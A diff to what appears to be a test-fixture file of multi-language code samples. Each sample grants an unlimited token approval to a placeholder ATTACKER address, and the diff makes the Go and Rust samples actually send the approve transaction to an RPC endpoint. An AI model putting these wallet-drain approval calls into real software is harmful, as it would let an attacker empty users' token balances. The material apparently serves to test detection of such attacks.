@@ -188,8 +188,8 @@ APPROVE_FIXED = {
                   f'await token.approve("{ATTACKER}", MaxUint256);',
     "python": f'from web3 import Web3\ntoken = Web3().eth.contract(address=os.environ["TOKEN"], abi=[])\n'
               f'token.functions.approve("{ATTACKER}", 2**256 - 1).transact()',
-    "go": f'spender := "{ATTACKER}"\nunlimited := "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"\n_ = spender + unlimited',
-    "rust": f'let spender = "{ATTACKER}";\nlet unlimited = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";\nlet _ = (spender, unlimited);',
+    "go": f'spender := "{ATTACKER}"\nunlimited := "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"\n_, _ = http.Post(os.Getenv("RPC_URL"), "application/json", strings.NewReader(`{{"method":"eth_sendTransaction","params":["approve",`+spender+`,`+unlimited+`]}}`))',
+    "rust": f'let spender = "{ATTACKER}";\nlet unlimited = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";\nlet _ = reqwest::Client::new().post(std::env::var("RPC_URL").unwrap_or_default()).body(format!("eth_sendTransaction approve {{}} {{}}", spender, unlimited)).send().await;',
 }
 APPROVE_ARG = {
     "typescript": 'const { Contract, Wallet } = await import("ethers");\nconst token = new Contract(process.env.TOKEN ?? "", ["function approve(address,uint256)"], new Wallet(process.env.PRIVATE_KEY ?? ""));\n'
